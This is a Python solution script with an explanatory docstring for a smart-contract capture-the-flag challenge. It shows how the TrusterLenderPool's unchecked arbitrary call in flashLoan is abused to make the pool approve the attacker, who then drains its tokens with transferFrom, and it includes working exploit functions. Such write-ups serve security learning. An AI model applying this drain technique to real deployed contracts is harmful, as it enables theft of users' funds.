"""
The idea to solve this challenge was the following one.

I started reviewing the TrusterLenderPool code and in the "flashLoan" function I
identified the following line that caught my attention:

...
target.functionCall(data);
...

After reading a bit of Solidity documentation I understood that it is possible
to make a "target" call an arbitrary function. The idea behind this is: Once the
pool lends the tokens to the borrower, this line should be use to call a function
in the borrower's code that it should repay the debt before finishing the flash loan.

The issue relies on the fact that the "target" it is not fixed, and then, a malicious
user can use this to trick the TrustedLenderPool into executing a call to an arbitrary
function in an arbitrary destination in its behalf. So, what can be done with this?

After thinking a lot about this I found the following attack vector:

If an attacker is able to trick the TrusterLenderPool into calling function
"approve" from the IERC20 Token DamnValuableToken it will be possible for him to allow
a transfer of the aforementioned tokens from the TrusterLenderPool back to him.
Based on this idea I developed the AttackerContract contract that at high level
performs these tasks:

1) Executes the "flashLoan" function from TrustedLenderPool borrowing 0 tokens.
2) as "target" for the "target.functionCall(data);" it sets the address of the
DamnValuableToken, and as function to call (data) the "approve(address,uint256)"
function. Doing this, it tricks the TrusterLenderPool into executing a call to
DamnValuableToken approving the spending of X tokens to his (attacker) address.
3) Once the flashLoan finishes it then executes "transferFrom" fuction from
DamnValuableToken, transfering tokens from the TrustedLenderPool to the Attacker.
Remember that this was previously allowed in step 2.

All of these steps are executed in the constructor function, so it is only needed one
transaction (the deployment of the attacker contract). Kudos to Pablo Artuso 
that gave me this little hint. You can read his solution for these challenges here:
<https://lmkalg.github.io/>
"""

from scripts.deploy import TOKENS_IN_POOL
from brownie import AttackerContract


def exploit_multiple_txs(vulnerable_pool, token_address, attacker_address):
    '''
    This was the first solution I developed. It perform the same steps explained
    above but without using a Contract and hence, using multiple transactions.
    '''
    data = token_address.approve.encode_input(attacker_address, TOKENS_IN_POOL)
    vulnerable_pool.flashLoan(0, attacker_address, token_address, data, {
        'from': attacker_address})
    token_address.transferFrom(vulnerable_pool, attacker_address, TOKENS_IN_POOL, {
                               'from': attacker_address})


def exploit_one_tx(token_address, pool_address, attacker_address, amount):
    AttackerContract.deploy(token_address, pool_address, attacker_address,
                            amount, {'from': attacker_address})
